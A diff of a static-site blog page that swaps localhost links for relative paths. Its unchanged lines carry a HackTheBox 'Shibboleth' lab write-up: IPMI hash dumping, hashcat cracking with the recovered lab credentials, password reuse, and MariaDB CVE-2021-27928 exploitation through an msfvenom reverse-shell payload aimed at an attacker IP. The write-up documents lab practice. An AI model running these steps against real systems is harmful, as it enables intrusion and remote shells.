@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
 
   <meta charset="utf-8" />
 
@@ -36,7 +36,7 @@
     <meta name="twitter:title" content="Shibboleth Hackthebox writeup">
     <meta name="twitter:description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version
 ">
-    <meta name="twitter:image" content="//localhost:1313/media/shibboleth/20220401204521.png">
+    <meta name="twitter:image" content="/media/shibboleth/20220401204521.png">
   
 
   
@@ -44,8 +44,8 @@
   <meta property="og:title" content="Shibboleth Hackthebox writeup">
   <meta property="og:description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version
 ">
-  <meta property="og:url" content="//localhost:1313/post/shibboleth/">
-  <meta property="og:image" content="//localhost:1313/media/shibboleth/20220401204521.png">
+  <meta property="og:url" content="/post/shibboleth/">
+  <meta property="og:image" content="/media/shibboleth/20220401204521.png">
 
 
 
@@ -53,7 +53,7 @@
 <meta name="generator" content="Hugo 0.86.1">
 
 
-<link rel="canonical" href="//localhost:1313/post/shibboleth/">
+<link rel="canonical" href="/post/shibboleth/">
 
 <meta name="renderer" content="webkit">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -78,20 +78,20 @@
 <meta name='msapplication-navbutton-color' content="#02b875">
 <meta name="msapplication-TileColor" content="#02b875">
 <meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="//localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="//localhost:1313/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="//localhost:1313/icons/icon-152x152.png">
-<link rel="manifest" href="//localhost:1313/manifest.json">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
 
 
-<link rel="preload" href="//localhost:1313/styles/main-rendered.min.css" as="style">
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
 
 
 <link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="//localhost:1313/images/avatar.gif" as="image">
-<link rel="preload" href="//localhost:1313/images/test.jpg" as="image">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/test.jpg" as="image">
 
 
 <style>
@@ -99,7 +99,7 @@
     background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
   }
 </style>
-<link rel="stylesheet" href="//localhost:1313/styles/main-rendered.min.css">
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
 
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
@@ -139,9 +139,9 @@
     
     
   <header class="site-header">
-  <a href="//localhost:1313/"><img class="avatar" src="//localhost:1313/images/avatar.gif" alt="Avatar"></a>
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
   
-  <h2 class="title"><a href="//localhost:1313/">0xMesbaha</a></h2>
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
   
   <p class="subtitle" style="color:#00ab6b">&gt; Hello Friend </p>
   <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
@@ -159,21 +159,21 @@
           
           
           ">
-          <a href="//localhost:1313/">Posts</a>
+          <a href="/">Posts</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="//localhost:1313/tags/">Tags</a>
+          <a href="/tags/">Tags</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="//localhost:1313/about/">About</a>
+          <a href="/about/">About</a>
         </li>
       
     </ul>
@@ -228,77 +228,77 @@ zabbix                  <span style="color:#f92672">[</span>Status: 200, Size: 3
 <pre><code>10.10.11.124	shibboleth.htb	monitor.shibboleth.htb	zabbix.shibboleth.htb
 </code></pre><p>the UDP port we have found eariler seems worthy to search for , and you can find <a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi">this</a> post from Hacktricks</p>
 <p>we can use that to find the version first</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401205846.png" alt="error">
+<p><img src="/media/shibboleth/20220401205846.png" alt="error">
 then we can try that :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401205951.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401205951.png" alt="error"></p>
 <p>seems to be <code>IPMI-2.0 UserAuth </code> , from the same post we can see :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401210253.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401210253.png" alt="error"></p>
 <p>we can try that :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401210325.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401210325.png" alt="error"></p>
 <p>and it retrieves a hash , we can see if we can crack it.</p>
 <p>from hashcat wiki <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a></p>
-<p><img src="//localhost:1313/media/shibboleth/20220401210453.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401210453.png" alt="error"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">7300</span> hash2 /usr/share/wordlists/rockyou.txt
-</code></pre></div><p><img src="//localhost:1313/media/shibboleth/20220401210621.png" alt="error"></p>
+</code></pre></div><p><img src="/media/shibboleth/20220401210621.png" alt="error"></p>
 <p>so now we have these credentials <code>Administrator:ilovepumkinpie1</code></p>
 <p>after this point i performed some enumeration to the <code>IPMI</code> like :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ipmitool -I lanplus -C <span style="color:#ae81ff">0</span> -H 10.10.11.124 -U Administrator -P ilovepumkinpie1  user list
 </code></pre></div><p>and other But seems i went so far from the foothold :(</p>
 <p>now we can take a look at the <code>TCP port 80</code> we have found earlier</p>
 <p><strong><code>shibboleth.htb</code></strong>  is not interesting at all , all pages are static</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401211105.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401211105.png" alt="error"></p>
 <p><strong><code>zabbix.shibboleth.htb</code></strong> has login page so obviously i tried the credentials we have</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401211214.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401211214.png" alt="error"></p>
 <p>and we are in :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401211319.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401211319.png" alt="error"></p>
 <h1 id="foothold">Foothold:</h1>
 <p>if you look at the footer you will find the zabbix version:</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401211354.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401211354.png" alt="error"></p>
 <p>searching for it i found no exploits , you can start doing your research and will find at the documentation <a href="https://www.zabbix.com/documentation/5.4/en/manual/config/notifications/action/operation/remote_command">here</a> the web interface can execute remote commands</p>
 <p>actually to exploit it you will do a lot of searching in different options at the web page until you find the page.</p>
 <p>at this time i was practicing python so why not to write my first published exploit ?</p>
 <p><img src="https://media.giphy.com/media/3MkhtxEKImJL3HbRzE/giphy.gif" alt=""></p>
 <p>you will find it <a href="https://www.exploit-db.com/exploits/50816">here</a></p>
-<p><img src="//localhost:1313/media/shibboleth/20220401212257.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401212257.png" alt="error"></p>
 <p>so let&rsquo;s download it and try using the exploit</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401212449.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401212449.png" alt="error"></p>
 <p>and after one minute:</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401212602.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401212602.png" alt="error"></p>
 <h1 id="privilege-escalation">Privilege escalation:</h1>
 <p>only one user exist which is <code>ipmi_svc</code> , and we have the password from the <code>ipmi</code> right , worthy trying it :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401212805.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401212805.png" alt="error"></p>
 <p>and it works</p>
 <h1 id="root-access">Root Access</h1>
 <p>Uploading Linpeas to the Box and start investigating the output :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401213204.png" alt="error"></p>
-<p><img src="//localhost:1313/media/shibboleth/20220401213240.png" alt="error"></p>
-<p><img src="//localhost:1313/media/shibboleth/20220401213444.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401213204.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401213240.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401213444.png" alt="error"></p>
 <p>and as we can see Maria DB is running locally only , and we can see <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220401/linpeas.sh">linpeas</a> found the username and the password to connect to the database, we can try interact with it</p>
 <p>we can read the file except the comments , hence it won&rsquo;t be applicable</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/zabbix/zabbix_server.conf | grep -v <span style="color:#e6db74">&#34;#&#34;</span> 
-</code></pre></div><p><img src="//localhost:1313/media/shibboleth/20220401214523.png" alt="error"></p>
+</code></pre></div><p><img src="/media/shibboleth/20220401214523.png" alt="error"></p>
 <p>now let&rsquo;s try interact with it :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#75715e"># password :bloooarskybluh</span>
  mysql -u zabbix -D zabbix -p 
 </code></pre></div><p>and we are in :</p>
-<p><img src="//localhost:1313/media/shibboleth/20220401214650.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401214650.png" alt="error"></p>
 <p>this Maria-DB version we see at the banner is Vulnerable to <strong><code>OS command injection</code></strong> , and we can find the exploit <a href="https://github.com/Al1ex/CVE-2021-27928">here</a></p>
 <p>following the steps:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.16.52 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f elf-so -o CVE-2021-27928.so
 </code></pre></div><p>set the listener and move the <code>.so</code> file to the Box. then on the box login to the database then :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">MariaDB <span style="color:#f92672">[</span>zabbix<span style="color:#f92672">]</span>&gt; SET GLOBAL wsrep_provider<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/dev/shm/CVE-2021-27928.so&#34;</span>;
-</code></pre></div><p><img src="//localhost:1313/media/shibboleth/20220401215308.png" alt="error"></p></article>
+</code></pre></div><p><img src="/media/shibboleth/20220401215308.png" alt="error"></p></article>
     <footer class="post-footer">
       
       <ul class="post-tags">
         
-          <li><a href="//localhost:1313/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
         
-          <li><a href="//localhost:1313/tags/ipmi"><span class="tag">Ipmi</span></a></li>
+          <li><a href="/tags/ipmi"><span class="tag">Ipmi</span></a></li>
         
-          <li><a href="//localhost:1313/tags/maria-db"><span class="tag">Maria-DB</span></a></li>
+          <li><a href="/tags/maria-db"><span class="tag">Maria-DB</span></a></li>
         
-          <li><a href="//localhost:1313/tags/zabbix"><span class="tag">Zabbix</span></a></li>
+          <li><a href="/tags/zabbix"><span class="tag">Zabbix</span></a></li>
         
       </ul>
       
@@ -352,7 +352,7 @@ then we can try that :</p>
 
 
 
-<script src="//localhost:1313/scripts/index.min.js"></script>
+<script src="/scripts/index.min.js"></script>
 
 <script>
   if ('serviceWorker' in navigator) {
